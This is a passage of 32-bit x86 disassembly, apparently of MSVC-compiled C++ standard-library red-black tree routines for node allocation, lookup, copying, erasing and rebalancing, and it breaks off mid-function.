   138d9:	int3   
   138da:	int3   
   138db:	int3   
   138dc:	mov    edi,edi
   138de:	push   ebp
   138df:	mov    ebp,esp
   138e1:	push   ebx
   138e2:	push   esi
   138e3:	push   edi
   138e4:	mov    edi,DWORD PTR [ebp+0x8]
   138e7:	mov    ebx,ecx
   138e9:	mov    esi,edi
   138eb:	cmp    edi,DWORD PTR ds:0x7f6c8
   138f1:	je     0x13910
   138f3:	push   DWORD PTR [esi+0x8]
   138f6:	mov    ecx,ebx
   138f8:	call   0x138dc
   138fd:	mov    esi,DWORD PTR [esi]
   138ff:	push   edi
   13900:	call   0x10a9a
   13905:	pop    ecx
   13906:	mov    edi,esi
   13908:	cmp    esi,DWORD PTR ds:0x7f6c8
   1390e:	jne    0x138f3
   13910:	pop    edi
   13911:	pop    esi
   13912:	pop    ebx
   13913:	pop    ebp
   13914:	ret    0x4
   13917:	int3   
   13918:	int3   
   13919:	int3   
   1391a:	int3   
   1391b:	int3   
   1391c:	mov    edi,edi
   1391e:	push   ebp
   1391f:	mov    ebp,esp
   13921:	push   ebx
   13922:	push   esi
   13923:	push   edi
   13924:	mov    edi,DWORD PTR [ebp+0x8]
   13927:	mov    ebx,ecx
   13929:	mov    esi,edi
   1392b:	cmp    edi,DWORD PTR ds:0x7f6cc
   13931:	je     0x13950
   13933:	push   DWORD PTR [esi+0x8]
   13936:	mov    ecx,ebx
   13938:	call   0x1391c
   1393d:	mov    esi,DWORD PTR [esi]
   1393f:	push   edi
   13940:	call   0x10a9a
   13945:	pop    ecx
   13946:	mov    edi,esi
   13948:	cmp    esi,DWORD PTR ds:0x7f6cc
   1394e:	jne    0x13933
   13950:	pop    edi
   13951:	pop    esi
   13952:	pop    ebx
   13953:	pop    ebp
   13954:	ret    0x4
   13957:	int3   
   13958:	int3   
   13959:	int3   
   1395a:	int3   
   1395b:	int3   
   1395c:	mov    edi,edi
   1395e:	push   ebp
   1395f:	mov    ebp,esp
   13961:	push   0x0
   13963:	push   0x18
   13965:	call   0x11636
   1396a:	mov    ecx,DWORD PTR [ebp+0x8]
   1396d:	mov    DWORD PTR [eax+0x4],ecx
   13970:	mov    ecx,DWORD PTR [ebp+0xc]
   13973:	mov    DWORD PTR [eax+0x14],ecx
   13976:	pop    ebp
   13977:	ret    0x8
   1397a:	int3   
   1397b:	int3   
   1397c:	int3   
   1397d:	int3   
   1397e:	int3   
   1397f:	int3   
   13980:	mov    edi,edi
   13982:	push   ebp
   13983:	mov    ebp,esp
   13985:	push   0x0
   13987:	push   0x70
   13989:	call   0x11636
   1398e:	mov    ecx,DWORD PTR [ebp+0x8]
   13991:	mov    DWORD PTR [eax+0x4],ecx
   13994:	mov    ecx,DWORD PTR [ebp+0xc]
   13997:	mov    DWORD PTR [eax+0x68],ecx
   1399a:	pop    ebp
   1399b:	ret    0x8
   1399e:	int3   
   1399f:	int3   
   139a0:	int3   
   139a1:	int3   
   139a2:	int3   
   139a3:	int3   
   139a4:	mov    edi,edi
   139a6:	push   ebp
   139a7:	mov    ebp,esp
   139a9:	push   0x0
   139ab:	push   0x14
   139ad:	call   0x11636
   139b2:	mov    ecx,DWORD PTR [ebp+0x8]
   139b5:	mov    DWORD PTR [eax+0x4],ecx
   139b8:	mov    ecx,DWORD PTR [ebp+0xc]
   139bb:	mov    DWORD PTR [eax+0x10],ecx
   139be:	pop    ebp
   139bf:	ret    0x8
   139c2:	int3   
   139c3:	int3   
   139c4:	int3   
   139c5:	int3   
   139c6:	int3   
   139c7:	int3   
   139c8:	mov    edi,edi
   139ca:	push   ebp
   139cb:	mov    ebp,esp
   139cd:	push   0x0
   139cf:	push   0x78
   139d1:	call   0x11636
   139d6:	mov    ecx,DWORD PTR [ebp+0x8]
   139d9:	mov    DWORD PTR [eax+0x4],ecx
   139dc:	mov    ecx,DWORD PTR [ebp+0xc]
   139df:	mov    DWORD PTR [eax+0x70],ecx
   139e2:	pop    ebp
   139e3:	ret    0x8
   139e6:	int3   
   139e7:	int3   
   139e8:	int3   
   139e9:	int3   
   139ea:	int3   
   139eb:	int3   
   139ec:	mov    edi,edi
   139ee:	push   ebp
   139ef:	mov    ebp,esp
   139f1:	push   0x0
   139f3:	push   0x20
   139f5:	call   0x11636
   139fa:	mov    ecx,DWORD PTR [ebp+0x8]
   139fd:	mov    DWORD PTR [eax+0x4],ecx
   13a00:	mov    ecx,DWORD PTR [ebp+0xc]
   13a03:	mov    DWORD PTR [eax+0x1c],ecx
   13a06:	pop    ebp
   13a07:	ret    0x8
   13a0a:	int3   
   13a0b:	int3   
   13a0c:	int3   
   13a0d:	int3   
   13a0e:	int3   
   13a0f:	int3   
   13a10:	mov    edi,edi
   13a12:	push   ebp
   13a13:	mov    ebp,esp
   13a15:	push   esi
   13a16:	push   edi
   13a17:	mov    edi,DWORD PTR [ebp+0x8]
   13a1a:	push   edi
   13a1b:	mov    esi,ecx
   13a1d:	call   0x129c8
   13a22:	add    edi,0x8
   13a25:	push   edi
   13a26:	lea    ecx,[esi+0x8]
   13a29:	call   0x13512
   13a2e:	pop    edi
   13a2f:	mov    eax,esi
   13a31:	pop    esi
   13a32:	pop    ebp
   13a33:	ret    0x4
   13a36:	int3   
   13a37:	int3   
   13a38:	int3   
   13a39:	int3   
   13a3a:	int3   
   13a3b:	int3   
   13a3c:	mov    edi,edi
   13a3e:	push   ebp
   13a3f:	mov    ebp,esp
   13a41:	push   ecx
   13a42:	push   DWORD PTR [ebp-0x4]
   13a45:	push   DWORD PTR [ebp+0x10]
   13a48:	push   DWORD PTR [ebp+0xc]
   13a4b:	push   DWORD PTR [ebp+0x8]
   13a4e:	call   0x13630
   13a53:	add    esp,0x10
   13a56:	leave  
   13a57:	ret    
   13a58:	int3   
   13a59:	int3   
   13a5a:	int3   
   13a5b:	int3   
   13a5c:	int3   
   13a5d:	int3   
   13a5e:	mov    edi,edi
   13a60:	push   ebp
   13a61:	mov    ebp,esp
   13a63:	push   ecx
   13a64:	push   DWORD PTR [ebp-0x4]
   13a67:	push   DWORD PTR [ebp+0x10]
   13a6a:	push   DWORD PTR [ebp+0xc]
   13a6d:	push   DWORD PTR [ebp+0x8]
   13a70:	call   0x1365a
   13a75:	add    esp,0x10
   13a78:	leave  
   13a79:	ret    
   13a7a:	int3   
   13a7b:	int3   
   13a7c:	int3   
   13a7d:	int3   
   13a7e:	int3   
   13a7f:	int3   
   13a80:	mov    edi,edi
   13a82:	push   ebp
   13a83:	mov    ebp,esp
   13a85:	push   ecx
   13a86:	push   DWORD PTR [ebp-0x4]
   13a89:	push   DWORD PTR [ebp+0x10]
   13a8c:	push   DWORD PTR [ebp+0xc]
   13a8f:	push   DWORD PTR [ebp+0x8]
   13a92:	call   0x13684
   13a97:	add    esp,0x10
   13a9a:	leave  
   13a9b:	ret    
   13a9c:	int3   
   13a9d:	int3   
   13a9e:	int3   
   13a9f:	int3   
   13aa0:	int3   
   13aa1:	int3   
   13aa2:	mov    edi,edi
   13aa4:	push   ebp
   13aa5:	mov    ebp,esp
   13aa7:	push   ecx
   13aa8:	push   DWORD PTR [ebp-0x4]
   13aab:	push   DWORD PTR [ebp+0x10]
   13aae:	push   DWORD PTR [ebp+0xc]
   13ab1:	push   DWORD PTR [ebp+0x8]
   13ab4:	call   0x136ae
   13ab9:	add    esp,0x10
   13abc:	leave  
   13abd:	ret    
   13abe:	int3   
   13abf:	int3   
   13ac0:	int3   
   13ac1:	int3   
   13ac2:	int3   
   13ac3:	int3   
   13ac4:	mov    edi,edi
   13ac6:	push   ebp
   13ac7:	mov    ebp,esp
   13ac9:	mov    ecx,DWORD PTR [ebp+0x8]
   13acc:	test   ecx,ecx
   13ace:	je     0x13ad8
   13ad0:	push   DWORD PTR [ebp+0xc]
   13ad3:	call   0x13a10
   13ad8:	pop    ebp
   13ad9:	ret    0x8
   13adc:	int3   
   13add:	int3   
   13ade:	int3   
   13adf:	int3   
   13ae0:	int3   
   13ae1:	int3   
   13ae2:	mov    edi,edi
   13ae4:	push   ebp
   13ae5:	mov    ebp,esp
   13ae7:	mov    ecx,DWORD PTR [ebp+0x8]
   13aea:	test   ecx,ecx
   13aec:	je     0x13af6
   13aee:	push   DWORD PTR [ebp+0xc]
   13af1:	call   0x13538
   13af6:	pop    ebp
   13af7:	ret    0x8
   13afa:	int3   
   13afb:	int3   
   13afc:	int3   
   13afd:	int3   
   13afe:	int3   
   13aff:	int3   
   13b00:	mov    edi,edi
   13b02:	push   ebp
   13b03:	mov    ebp,esp
   13b05:	mov    ecx,DWORD PTR [ebp+0x8]
   13b08:	push   0x0
   13b0a:	call   0x13564
   13b0f:	pop    ebp
   13b10:	ret    0x4
   13b13:	int3   
   13b14:	int3   
   13b15:	int3   
   13b16:	int3   
   13b17:	int3   
   13b18:	mov    edi,edi
   13b1a:	push   ebp
   13b1b:	mov    ebp,esp
   13b1d:	mov    ecx,DWORD PTR [ebp+0x8]
   13b20:	test   ecx,ecx
   13b22:	je     0x13b2c
   13b24:	push   DWORD PTR [ebp+0xc]
   13b27:	call   0x134ce
   13b2c:	pop    ebp
   13b2d:	ret    0x8
   13b30:	int3   
   13b31:	int3   
   13b32:	int3   
   13b33:	int3   
   13b34:	int3   
   13b35:	int3   
   13b36:	mov    edi,edi
   13b38:	push   ebp
   13b39:	mov    ebp,esp
   13b3b:	mov    ecx,DWORD PTR [ebp+0x8]
   13b3e:	test   ecx,ecx
   13b40:	je     0x13b4a
   13b42:	push   DWORD PTR [ebp+0xc]
   13b45:	call   0x1358a
   13b4a:	pop    ebp
   13b4b:	ret    0x8
   13b4e:	int3   
   13b4f:	int3   
   13b50:	int3   
   13b51:	int3   
   13b52:	int3   
   13b53:	int3   
   13b54:	mov    edi,edi
   13b56:	push   ebp
   13b57:	mov    ebp,esp
   13b59:	mov    ecx,DWORD PTR [ebp+0x8]
   13b5c:	push   0x0
   13b5e:	call   0x135b2
   13b63:	pop    ebp
   13b64:	ret    0x4
   13b67:	int3   
   13b68:	int3   
   13b69:	int3   
   13b6a:	int3   
   13b6b:	int3   
   13b6c:	mov    edi,edi
   13b6e:	push   ebp
   13b6f:	mov    ebp,esp
   13b71:	mov    ecx,DWORD PTR [ebp+0x8]
   13b74:	test   ecx,ecx
   13b76:	je     0x13b80
   13b78:	push   DWORD PTR [ebp+0xc]
   13b7b:	call   0x134a2
   13b80:	pop    ebp
   13b81:	ret    0x8
   13b84:	int3   
   13b85:	int3   
   13b86:	int3   
   13b87:	int3   
   13b88:	int3   
   13b89:	int3   
   13b8a:	mov    edi,edi
   13b8c:	push   ebp
   13b8d:	mov    ebp,esp
   13b8f:	push   ecx
   13b90:	mov    eax,ds:0x7f6cc
   13b95:	push   ebx
   13b96:	mov    ebx,DWORD PTR [ebp+0xc]
   13b99:	push   esi
   13b9a:	mov    esi,DWORD PTR [ebp+0x8]
   13b9d:	mov    DWORD PTR [ebp-0x4],ecx
   13ba0:	mov    DWORD PTR [ebp+0x8],esi
   13ba3:	cmp    esi,eax
   13ba5:	je     0x13bea
   13ba7:	push   edi
   13ba8:	push   DWORD PTR [esi+0x10]
   13bab:	mov    ecx,DWORD PTR [ebp-0x4]
   13bae:	push   ebx
   13baf:	call   0x139a4
   13bb4:	mov    edi,eax
   13bb6:	cmp    DWORD PTR [ebp+0x8],esi
   13bb9:	jne    0x13bbe
   13bbb:	mov    DWORD PTR [ebp+0x8],edi
   13bbe:	mov    ecx,DWORD PTR [ebp-0x4]
   13bc1:	push   edi
   13bc2:	push   DWORD PTR [esi+0x8]
   13bc5:	call   0x13b8a
   13bca:	mov    DWORD PTR [edi+0x8],eax
   13bcd:	lea    eax,[esi+0xc]
   13bd0:	push   eax
   13bd1:	lea    eax,[edi+0xc]
   13bd4:	push   eax
   13bd5:	call   0x11658
   13bda:	mov    DWORD PTR [ebx],edi
   13bdc:	mov    esi,DWORD PTR [esi]
   13bde:	mov    eax,ds:0x7f6cc
   13be3:	mov    ebx,edi
   13be5:	cmp    esi,eax
   13be7:	jne    0x13ba8
   13be9:	pop    edi
   13bea:	mov    DWORD PTR [ebx],eax
   13bec:	mov    eax,DWORD PTR [ebp+0x8]
   13bef:	pop    esi
   13bf0:	pop    ebx
   13bf1:	leave  
   13bf2:	ret    0x8
   13bf5:	int3   
   13bf6:	int3   
   13bf7:	int3   
   13bf8:	int3   
   13bf9:	int3   
   13bfa:	mov    edi,edi
   13bfc:	push   ebp
   13bfd:	mov    ebp,esp
   13bff:	push   ecx
   13c00:	push   esi
   13c01:	push   edi
   13c02:	mov    edi,DWORD PTR [ebp+0xc]
   13c05:	push   edi
   13c06:	mov    esi,ecx
   13c08:	call   0x12d32
   13c0d:	mov    esi,DWORD PTR [esi+0x4]
   13c10:	mov    DWORD PTR [ebp+0xc],eax
   13c13:	cmp    eax,esi
   13c15:	je     0x13c23
   13c17:	mov    ecx,DWORD PTR [edi]
   13c19:	cmp    ecx,DWORD PTR [eax+0xc]
   13c1c:	jb     0x13c23
   13c1e:	lea    eax,[ebp+0xc]
   13c21:	jmp    0x13c29
   13c23:	mov    DWORD PTR [ebp-0x4],esi
   13c26:	lea    eax,[ebp-0x4]
   13c29:	mov    ecx,DWORD PTR [eax]
   13c2b:	mov    eax,DWORD PTR [ebp+0x8]
   13c2e:	pop    edi
   13c2f:	mov    DWORD PTR [eax],ecx
   13c31:	pop    esi
   13c32:	leave  
   13c33:	ret    0x8
   13c36:	int3   
   13c37:	int3   
   13c38:	int3   
   13c39:	int3   
   13c3a:	int3   
   13c3b:	int3   
   13c3c:	mov    edi,edi
   13c3e:	push   ebp
   13c3f:	mov    ebp,esp
   13c41:	push   ecx
   13c42:	push   esi
   13c43:	push   DWORD PTR [ebp+0xc]
   13c46:	mov    esi,ecx
   13c48:	call   0x12e08
   13c4d:	mov    DWORD PTR [ebp-0x4],eax
   13c50:	cmp    eax,DWORD PTR [esi+0x4]
   13c53:	je     0x13c6a
   13c55:	add    eax,0x10
   13c58:	push   eax
   13c59:	push   DWORD PTR [ebp+0xc]
   13c5c:	call   0x197e8
   13c61:	test   al,al
   13c63:	jne    0x13c6a
   13c65:	lea    eax,[ebp-0x4]
   13c68:	jmp    0x13c73
   13c6a:	mov    eax,DWORD PTR [esi+0x4]
   13c6d:	mov    DWORD PTR [ebp+0xc],eax
   13c70:	lea    eax,[ebp+0xc]
   13c73:	mov    ecx,DWORD PTR [eax]
   13c75:	mov    eax,DWORD PTR [ebp+0x8]
   13c78:	mov    DWORD PTR [eax],ecx
   13c7a:	pop    esi
   13c7b:	leave  
   13c7c:	ret    0x8
   13c7f:	int3   
   13c80:	int3   
   13c81:	int3   
   13c82:	int3   
   13c83:	int3   
   13c84:	mov    edi,edi
   13c86:	push   ebp
   13c87:	mov    ebp,esp
   13c89:	push   ecx
   13c8a:	push   esi
   13c8b:	push   DWORD PTR [ebp+0xc]
   13c8e:	mov    esi,ecx
   13c90:	call   0x12e48
   13c95:	mov    DWORD PTR [ebp-0x4],eax
   13c98:	cmp    eax,DWORD PTR [esi+0x4]
   13c9b:	je     0x13cb2
   13c9d:	add    eax,0xc
   13ca0:	push   eax
   13ca1:	push   DWORD PTR [ebp+0xc]
   13ca4:	call   0x197e8
   13ca9:	test   al,al
   13cab:	jne    0x13cb2
   13cad:	lea    eax,[ebp-0x4]
   13cb0:	jmp    0x13cbb
   13cb2:	mov    eax,DWORD PTR [esi+0x4]
   13cb5:	mov    DWORD PTR [ebp+0xc],eax
   13cb8:	lea    eax,[ebp+0xc]
   13cbb:	mov    ecx,DWORD PTR [eax]
   13cbd:	mov    eax,DWORD PTR [ebp+0x8]
   13cc0:	mov    DWORD PTR [eax],ecx
   13cc2:	pop    esi
   13cc3:	leave  
   13cc4:	ret    0x8
   13cc7:	int3   
   13cc8:	int3   
   13cc9:	int3   
   13cca:	int3   
   13ccb:	int3   
   13ccc:	mov    edi,edi
   13cce:	push   ebp
   13ccf:	mov    ebp,esp
   13cd1:	push   ecx
   13cd2:	push   esi
   13cd3:	push   edi
   13cd4:	mov    edi,DWORD PTR [ebp+0xc]
   13cd7:	push   edi
   13cd8:	mov    esi,ecx
   13cda:	call   0x12e88
   13cdf:	mov    esi,DWORD PTR [esi+0x4]
   13ce2:	mov    DWORD PTR [ebp+0xc],eax
   13ce5:	cmp    eax,esi
   13ce7:	je     0x13cf5
   13ce9:	mov    ecx,DWORD PTR [edi]
   13ceb:	cmp    ecx,DWORD PTR [eax+0xc]
   13cee:	jl     0x13cf5
   13cf0:	lea    eax,[ebp+0xc]
   13cf3:	jmp    0x13cfb
   13cf5:	mov    DWORD PTR [ebp-0x4],esi
   13cf8:	lea    eax,[ebp-0x4]
   13cfb:	mov    ecx,DWORD PTR [eax]
   13cfd:	mov    eax,DWORD PTR [ebp+0x8]
   13d00:	pop    edi
   13d01:	mov    DWORD PTR [eax],ecx
   13d03:	pop    esi
   13d04:	leave  
   13d05:	ret    0x8
   13d08:	int3   
   13d09:	int3   
   13d0a:	int3   
   13d0b:	int3   
   13d0c:	int3   
   13d0d:	int3   
   13d0e:	mov    edi,edi
   13d10:	push   ebp
   13d11:	mov    ebp,esp
   13d13:	push   ecx
   13d14:	mov    eax,DWORD PTR [ecx]
   13d16:	lea    ecx,[ebp-0x4]
   13d19:	mov    DWORD PTR [ebp-0x4],eax
   13d1c:	call   0x12ef6
   13d21:	mov    eax,DWORD PTR [ebp-0x4]
   13d24:	add    eax,0xc
   13d27:	leave  
   13d28:	ret    
   13d29:	int3   
   13d2a:	int3   
   13d2b:	int3   
   13d2c:	int3   
   13d2d:	int3   
   13d2e:	mov    edi,edi
   13d30:	push   ebp
   13d31:	mov    ebp,esp
   13d33:	push   ecx
   13d34:	push   esi
   13d35:	push   DWORD PTR [ebp+0xc]
   13d38:	mov    esi,ecx
   13d3a:	call   0x1300a
   13d3f:	mov    DWORD PTR [ebp-0x4],eax
   13d42:	cmp    eax,DWORD PTR [esi+0x4]
   13d45:	je     0x13d5c
   13d47:	add    eax,0x10
   13d4a:	push   eax
   13d4b:	push   DWORD PTR [ebp+0xc]
   13d4e:	call   0x197e8
   13d53:	test   al,al
   13d55:	jne    0x13d5c
   13d57:	lea    eax,[ebp-0x4]
   13d5a:	jmp    0x13d65
   13d5c:	mov    eax,DWORD PTR [esi+0x4]
   13d5f:	mov    DWORD PTR [ebp+0xc],eax
   13d62:	lea    eax,[ebp+0xc]
   13d65:	mov    ecx,DWORD PTR [eax]
   13d67:	mov    eax,DWORD PTR [ebp+0x8]
   13d6a:	mov    DWORD PTR [eax],ecx
   13d6c:	pop    esi
   13d6d:	leave  
   13d6e:	ret    0x8
   13d71:	int3   
   13d72:	int3   
   13d73:	int3   
   13d74:	int3   
   13d75:	int3   
   13d76:	mov    edi,edi
   13d78:	push   ebp
   13d79:	mov    ebp,esp
   13d7b:	push   ecx
   13d7c:	push   ecx
   13d7d:	push   ebx
   13d7e:	push   esi
   13d7f:	mov    DWORD PTR [ebp-0x4],ecx
   13d82:	push   edi
   13d83:	mov    edi,DWORD PTR [ebp+0xc]
   13d86:	lea    ecx,[ebp+0xc]
   13d89:	call   0x112e8
   13d8e:	mov    esi,DWORD PTR [edi]
   13d90:	mov    eax,ds:0x7f6c8
   13d95:	mov    ebx,edi
   13d97:	mov    DWORD PTR [ebp-0x8],esi
   13d9a:	cmp    esi,eax
   13d9c:	jne    0x13dba
   13d9e:	mov    esi,DWORD PTR [edi+0x8]
   13da1:	mov    eax,DWORD PTR [ebx+0x4]
   13da4:	mov    ecx,DWORD PTR [ebp-0x4]
   13da7:	mov    DWORD PTR [esi+0x4],eax
   13daa:	mov    eax,DWORD PTR [ecx+0x4]
   13dad:	cmp    DWORD PTR [eax+0x4],edi
   13db0:	jne    0x13e2f
   13db2:	mov    DWORD PTR [eax+0x4],esi
   13db5:	jmp    0x13e3d
   13dba:	mov    ecx,DWORD PTR [edi+0x8]
   13dbd:	cmp    ecx,eax
   13dbf:	je     0x13da1
   13dc1:	push   ecx
   13dc2:	call   0x111fe
   13dc7:	mov    ebx,eax
   13dc9:	mov    esi,DWORD PTR [ebx+0x8]
   13dcc:	cmp    ebx,edi
   13dce:	je     0x13da1
   13dd0:	mov    eax,DWORD PTR [ebp-0x8]
   13dd3:	mov    DWORD PTR [eax+0x4],ebx
   13dd6:	mov    eax,DWORD PTR [edi]
   13dd8:	mov    DWORD PTR [ebx],eax
   13dda:	cmp    ebx,DWORD PTR [edi+0x8]
   13ddd:	jne    0x13de4
   13ddf:	mov    DWORD PTR [esi+0x4],ebx
   13de2:	jmp    0x13dfb
   13de4:	mov    eax,DWORD PTR [ebx+0x4]
   13de7:	mov    DWORD PTR [esi+0x4],eax
   13dea:	mov    eax,DWORD PTR [ebx+0x4]
   13ded:	mov    DWORD PTR [eax],esi
   13def:	mov    eax,DWORD PTR [edi+0x8]
   13df2:	mov    DWORD PTR [ebx+0x8],eax
   13df5:	mov    eax,DWORD PTR [edi+0x8]
   13df8:	mov    DWORD PTR [eax+0x4],ebx
   13dfb:	mov    eax,DWORD PTR [ebp-0x4]
   13dfe:	mov    eax,DWORD PTR [eax+0x4]
   13e01:	cmp    DWORD PTR [eax+0x4],edi
   13e04:	jne    0x13e0b
   13e06:	mov    DWORD PTR [eax+0x4],ebx
   13e09:	jmp    0x13e19
   13e0b:	mov    eax,DWORD PTR [edi+0x4]
   13e0e:	cmp    DWORD PTR [eax],edi
   13e10:	jne    0x13e16
   13e12:	mov    DWORD PTR [eax],ebx
   13e14:	jmp    0x13e19
   13e16:	mov    DWORD PTR [eax+0x8],ebx
   13e19:	mov    eax,DWORD PTR [edi+0x4]
   13e1c:	mov    DWORD PTR [ebx+0x4],eax
   13e1f:	mov    eax,DWORD PTR [ebx+0x14]
   13e22:	mov    ecx,DWORD PTR [edi+0x14]
   13e25:	mov    DWORD PTR [ebx+0x14],ecx
   13e28:	mov    DWORD PTR [edi+0x14],eax
   13e2b:	mov    ebx,edi
   13e2d:	jmp    0x13e90
   13e2f:	mov    eax,DWORD PTR [edi+0x4]
   13e32:	cmp    DWORD PTR [eax],edi
   13e34:	jne    0x13e3a
   13e36:	mov    DWORD PTR [eax],esi
   13e38:	jmp    0x13e3d
   13e3a:	mov    DWORD PTR [eax+0x8],esi
   13e3d:	mov    eax,DWORD PTR [ecx+0x4]
   13e40:	mov    DWORD PTR [ebp-0x8],eax
   13e43:	cmp    DWORD PTR [eax],edi
   13e45:	jne    0x13e67
   13e47:	mov    edx,DWORD PTR [edi+0x8]
   13e4a:	cmp    edx,DWORD PTR ds:0x7f6c8
   13e50:	jne    0x13e59
   13e52:	mov    edx,DWORD PTR [edi+0x4]
   13e55:	mov    DWORD PTR [eax],edx
   13e57:	jmp    0x13e67
   13e59:	push   esi
   13e5a:	call   0x111fe
   13e5f:	mov    ecx,DWORD PTR [ebp-0x8]
   13e62:	mov    DWORD PTR [ecx],eax
   13e64:	mov    ecx,DWORD PTR [ebp-0x4]
   13e67:	mov    eax,DWORD PTR [ecx+0x4]
   13e6a:	mov    DWORD PTR [ebp-0x8],eax
   13e6d:	cmp    DWORD PTR [eax+0x8],edi
   13e70:	jne    0x13e90
   13e72:	mov    ecx,DWORD PTR [edi]
   13e74:	cmp    ecx,DWORD PTR ds:0x7f6c8
   13e7a:	jne    0x13e84
   13e7c:	mov    ecx,DWORD PTR [edi+0x4]
   13e7f:	mov    DWORD PTR [eax+0x8],ecx
   13e82:	jmp    0x13e90
   13e84:	push   esi
   13e85:	call   0x111dc
   13e8a:	mov    ecx,DWORD PTR [ebp-0x8]
   13e8d:	mov    DWORD PTR [ecx+0x8],eax
   13e90:	xor    edi,edi
   13e92:	inc    edi
   13e93:	cmp    DWORD PTR [ebx+0x14],edi
   13e96:	jne    0x13fad
   13e9c:	jmp    0x13f5b
   13ea1:	cmp    DWORD PTR [esi+0x14],edi
   13ea4:	jne    0x13faa
   13eaa:	mov    eax,DWORD PTR [esi+0x4]
   13ead:	cmp    esi,DWORD PTR [eax]
   13eaf:	jne    0x13f26
   13eb1:	mov    eax,DWORD PTR [eax+0x8]
   13eb4:	cmp    DWORD PTR [eax+0x14],0x0
   13eb8:	jne    0x13ed2
   13eba:	mov    DWORD PTR [eax+0x14],edi
   13ebd:	mov    eax,DWORD PTR [esi+0x4]
   13ec0:	and    DWORD PTR [eax+0x14],0x0
   13ec4:	push   DWORD PTR [esi+0x4]
   13ec7:	call   0x12d6a
   13ecc:	mov    eax,DWORD PTR [esi+0x4]
   13ecf:	mov    eax,DWORD PTR [eax+0x8]
   13ed2:	mov    ecx,DWORD PTR [eax]
   13ed4:	cmp    DWORD PTR [ecx+0x14],edi
   13ed7:	jne    0x13ee1
   13ed9:	mov    ecx,DWORD PTR [eax+0x8]
   13edc:	cmp    DWORD PTR [ecx+0x14],edi
   13edf:	je     0x13f54
   13ee1:	mov    ecx,DWORD PTR [eax+0x8]
   13ee4:	cmp    DWORD PTR [ecx+0x14],edi
   13ee7:	jne    0x13f01
   13ee9:	mov    ecx,DWORD PTR [eax]
   13eeb:	mov    DWORD PTR [ecx+0x14],edi
   13eee:	mov    ecx,DWORD PTR [ebp-0x4]
   13ef1:	and    DWORD PTR [eax+0x14],0x0
   13ef5:	push   eax
   13ef6:	call   0x12db8
   13efb:	mov    eax,DWORD PTR [esi+0x4]
   13efe:	mov    eax,DWORD PTR [eax+0x8]
   13f01:	mov    ecx,DWORD PTR [esi+0x4]
   13f04:	mov    ecx,DWORD PTR [ecx+0x14]
   13f07:	mov    DWORD PTR [eax+0x14],ecx
   13f0a:	mov    ecx,DWORD PTR [esi+0x4]
   13f0d:	mov    DWORD PTR [ecx+0x14],edi
   13f10:	mov    eax,DWORD PTR [eax+0x8]
   13f13:	mov    ecx,DWORD PTR [ebp-0x4]
   13f16:	mov    DWORD PTR [eax+0x14],edi
   13f19:	push   DWORD PTR [esi+0x4]
   13f1c:	call   0x12d6a
   13f21:	jmp    0x13faa
   13f26:	mov    eax,DWORD PTR [eax]
   13f28:	cmp    DWORD PTR [eax+0x14],0x0
   13f2c:	jne    0x13f45
   13f2e:	mov    DWORD PTR [eax+0x14],edi
   13f31:	mov    eax,DWORD PTR [esi+0x4]
   13f34:	and    DWORD PTR [eax+0x14],0x0
   13f38:	push   DWORD PTR [esi+0x4]
   13f3b:	call   0x12db8
   13f40:	mov    eax,DWORD PTR [esi+0x4]
   13f43:	mov    eax,DWORD PTR [eax]
   13f45:	mov    ecx,DWORD PTR [eax+0x8]
   13f48:	cmp    DWORD PTR [ecx+0x14],edi
   13f4b:	jne    0x13f6c
   13f4d:	mov    ecx,DWORD PTR [eax]
   13f4f:	cmp    DWORD PTR [ecx+0x14],edi
   13f52:	jne    0x13f6c
   13f54:	and    DWORD PTR [eax+0x14],0x0
   13f58:	mov    esi,DWORD PTR [esi+0x4]
   13f5b:	mov    ecx,DWORD PTR [ebp-0x4]
   13f5e:	mov    eax,DWORD PTR [ecx+0x4]
   13f61:	cmp    esi,DWORD PTR [eax+0x4]
   13f64:	jne    0x13ea1
   13f6a:	jmp    0x13faa
   13f6c:	mov    ecx,DWORD PTR [eax]
   13f6e:	cmp    DWORD PTR [ecx+0x14],edi
   13f71:	jne    0x13f8b
   13f73:	mov    ecx,DWORD PTR [eax+0x8]
   13f76:	mov    DWORD PTR [ecx+0x14],edi
   13f79:	mov    ecx,DWORD PTR [ebp-0x4]
   13f7c:	and    DWORD PTR [eax+0x14],0x0
   13f80:	push   eax
   13f81:	call   0x12d6a
   13f86:	mov    eax,DWORD PTR [esi+0x4]
   13f89:	mov    eax,DWORD PTR [eax]
   13f8b:	mov    ecx,DWORD PTR [esi+0x4]
   13f8e:	mov    ecx,DWORD PTR [ecx+0x14]
   13f91:	mov    DWORD PTR [eax+0x14],ecx
   13f94:	mov    ecx,DWORD PTR [esi+0x4]
   13f97:	mov    DWORD PTR [ecx+0x14],edi
   13f9a:	mov    eax,DWORD PTR [eax]
   13f9c:	mov    ecx,DWORD PTR [ebp-0x4]
   13f9f:	mov    DWORD PTR [eax+0x14],edi
   13fa2:	push   DWORD PTR [esi+0x4]
   13fa5:	call   0x12db8
   13faa:	mov    DWORD PTR [esi+0x14],edi
   13fad:	push   ebx
   13fae:	call   0x10a9a
   13fb3:	mov    eax,DWORD PTR [ebp-0x4]
   13fb6:	dec    DWORD PTR [eax+0xc]
   13fb9:	mov    eax,DWORD PTR [ebp+0x8]
   13fbc:	pop    ecx
   13fbd:	mov    ecx,DWORD PTR [ebp+0xc]
   13fc0:	pop    edi
   13fc1:	pop    esi
   13fc2:	mov    DWORD PTR [eax],ecx
   13fc4:	pop    ebx
   13fc5:	leave  
   13fc6:	ret    0x8
   13fc9:	int3   
   13fca:	int3   
   13fcb:	int3   
   13fcc:	int3   
   13fcd:	int3   
   13fce:	mov    edi,edi
   13fd0:	push   ebp
   13fd1:	mov    ebp,esp
   13fd3:	push   esi
   13fd4:	push   edi
   13fd5:	push   DWORD PTR [ebp+0xc]
   13fd8:	mov    edi,ecx
   13fda:	call   0x130e8
   13fdf:	push   DWORD PTR [ebp+0xc]
   13fe2:	mov    ecx,edi
   13fe4:	mov    esi,eax
   13fe6:	call   0x12d32
   13feb:	mov    ecx,DWORD PTR [ebp+0x8]
   13fee:	pop    edi
   13fef:	mov    DWORD PTR [ecx],eax
   13ff1:	mov    DWORD PTR [ecx+0x4],esi
   13ff4:	mov    eax,ecx
   13ff6:	pop    esi
   13ff7:	pop    ebp
   13ff8:	ret    0x8
   13ffb:	int3   
   13ffc:	int3   
   13ffd:	int3   
   13ffe:	int3   
   13fff:	int3   
   14000:	mov    edi,edi
   14002:	push   esi
   14003:	push   edi
   14004:	push   0x1
   14006:	xor    edi,edi
   14008:	push   edi
   14009:	mov    esi,ecx
   1400b:	call   0x1395c
